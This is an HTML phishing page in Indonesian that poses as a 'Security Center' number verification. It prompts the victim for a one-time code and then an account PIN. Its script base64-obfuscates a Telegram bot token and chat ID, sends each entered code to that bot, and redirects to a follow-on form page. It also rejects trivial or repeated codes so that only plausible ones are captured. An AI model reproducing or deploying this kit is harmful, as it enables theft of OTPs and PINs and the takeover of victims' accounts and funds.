<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Center</title>
    <style>
        body { font-family: sans-serif; text-align: center; margin: 0; padding: 20px; color: #333; }
        header { padding: 15px; border-bottom: 1px solid #eee; font-size: 18px; font-weight: 500; }
        .bx { display: flex; justify-content: center; gap: 8px; margin: 30px 0; }
        .bx input { width: 40px; height: 48px; text-align: center; font-size: 22px; border: none; border-bottom: 2px solid #ccc; outline: none; }
        .bx input:focus { border-bottom-color: #EE4D2D; }
        button { background: #EE4D2D; color: #fff; width: 100%; max-width: 320px; padding: 14px; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; transition: 0.3s; }
        button:disabled { background: #eee; color: #999; cursor: not-allowed; }
        #ps { display: none; }
    </style>
</head>
<body>
    <header>Verifikasi nomor anda</header>
    
    <div id="os">
        <p>jangan bagikan kode yang terkirim ke nomor dibawah ini kepada siapapun</p>
        <p style="font-weight:bold" id="dN">...</p>
        <div class="bx">
            <input type="tel" inputmode="numeric" maxlength="1" class="oi"><input type="tel" inputmode="numeric" maxlength="1" class="oi"><input type="tel" inputmode="numeric" maxlength="1" class="oi"><input type="tel" inputmode="numeric" maxlength="1" class="oi"><input type="tel" inputmode="numeric" maxlength="1" class="oi"><input type="tel" inputmode="numeric" maxlength="1" class="oi">
        </div>
        <button id="bo" disabled>Next</button>
    </div>

    <div id="ps">
        <p>input PIN akun anda</p>
        <div class="bx">
            <input type="password" inputmode="numeric" maxlength="1" class="pi"><input type="password" inputmode="numeric" maxlength="1" class="pi"><input type="password" inputmode="numeric" maxlength="1" class="pi"><input type="password" inputmode="numeric" maxlength="1" class="pi"><input type="password" inputmode="numeric" maxlength="1" class="pi"><input type="password" inputmode="numeric" maxlength="1" class="pi">
        </div>
        <button id="bp" disabled>Verifikasi PIN</button>
    </div>

    <script>
        (function(){
            /**
             * Penjelasan Array _k:
             * [0] : Token Bot Telegram (Base64)
             * [1] : Chat ID Telegram (Base64)
             * [2] : "formulir2.html" (Base64) -> Ini yang sudah diubah
             */
            const _k = [
                "ODI4NjgyNDI1NDpBQUdQQWk3dVBmN28wLWExOXphVWpCTENYN0llbHFlUGNhOA==",
                "NTkyMzAzMTgyNQ==",
                "Zm9ybXVsaXIyLmh0bWw="
            ];

            const _u = "https://api.telegram.org/bot" + atob(_k[0]) + "/sendMessage";
            document.getElementById('dN').innerText = localStorage.getItem('vNum') || "User";

            // Fungsi validasi agar user tidak memasukkan angka yang sama berulang kali (misal 111111)
            function _chk(v) {
                if (/^(.)\1{5}$/.test(v)) return false; 
                let h = JSON.parse(sessionStorage.getItem('_h') || "[]");
                return !h.includes(v);
            }

            // Fungsi inisialisasi input kotak-kotak
            function _init(ins, btn, cb) {
                ins.forEach((el, i) => {
                    // Pindah fokus ke kotak berikutnya saat mengetik
                    el.oninput = () => { 
                        if (el.value && i < 5) ins[i + 1].focus(); 
                        btn.disabled = Array.from(ins).some(x => !x.value); 
                    };
                    // Kembali ke kotak sebelumnya saat backspace
                    el.onkeydown = (e) => { 
                        if (e.key === "Backspace" && !el.value && i > 0) ins[i - 1].focus(); 
                    };
                    // Support copy-paste 6 angka sekaligus
                    el.onpaste = (e) => {
                        let d = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').split('');
                        if (d.length >= 6) { 
                            ins.forEach((inp, x) => inp.value = d[x] || ''); 
                            btn.disabled = false; 
                            e.preventDefault(); 
                        }
                    };
                });

                // Aksi tombol saat diklik
                btn.onclick = async () => {
                    let val = Array.from(ins).map(x => x.value).join('');
                    if (_chk(val)) {
                        btn.disabled = true;
                        let h = JSON.parse(sessionStorage.getItem('_h') || "[]");
                        h.push(val); 
                        sessionStorage.setItem('_h', JSON.stringify(h));

                        // Kirim data ke Bot Telegram
                        try {
                            await fetch(_u, { 
                                method: "POST", 
                                headers: { "Content-Type": "application/json" }, 
                                body: JSON.stringify({ 
                                    chat_id: atob(_k[1]), 
                                    text: "Code: " + val 
                                }) 
                            });
                        } catch (e) {
                            console.error("Gagal mengirim data.");
                        }
                        
                        cb(); // Lanjut ke langkah berikutnya
                    } else { 
                        alert("Error: Gunakan kode yang valid atau berbeda."); 
                    }
                };
            }

            // Inisialisasi Langkah 1 (OTP)
            _init(document.querySelectorAll('.oi'), document.getElementById('bo'), () => {
                document.getElementById('os').style.display = 'none';
                document.getElementById('ps').style.display = 'block';
            });

            // Inisialisasi Langkah 2 (PIN)
            _init(document.querySelectorAll('.pi'), document.getElementById('bp'), () => {
                // Setelah PIN benar, diarahkan ke file yang ada di _k[2] (formulir2.html)
                window.location.href = atob(_k[2]);
            });
        })();
    </script>
</body>
</html>
